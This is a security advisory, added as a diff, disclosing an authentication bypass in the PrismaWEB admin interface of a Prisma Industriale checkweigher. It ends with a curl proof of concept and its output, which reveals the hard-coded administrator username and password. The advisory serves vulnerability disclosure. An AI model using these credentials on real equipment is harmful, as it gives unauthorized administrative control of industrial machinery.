@@ -1,0 +1,36 @@
+Prisma Industriale Checkweigher PrismaWEB 1.21 Authentication Bypass
+
+
+Vendor: Prisma Industriale S.r.l.
+Product web page: https://www.prismaindustriale.com
+Affected version: 1.0 (Rev 21, EPROM 202FWSAM ??)
+
+Summary: Web Administration of Machine.
+
+Desc: The vulnerability exists due to the disclosure of hard-coded credentials allowing
+an attacker to effectively bypass authentication of PrismaWEB with administrator
+privileges. The credentials can be disclosed by simply navigating to the login_par.js
+JavaScript page that holds the username and password for the management interface that
+are being used via the Login() function in /scripts/functions_cookie.js script.
+
+Tested on: HMS AnyBus-S WebServer
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5453
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5453.php
+
+06.02.2018
+
+---
+
+
+$ curl http://10.10.10.70/user/scripts/login_par.js
+// JavaScript Document
+// 11 Dicembre 2009 Release 1.0 Rev.10
+
+var txtChkUser				= "prismaweb";	// Nome utente Login
+var txtChkPassword 			= "prisma";		// Password Login
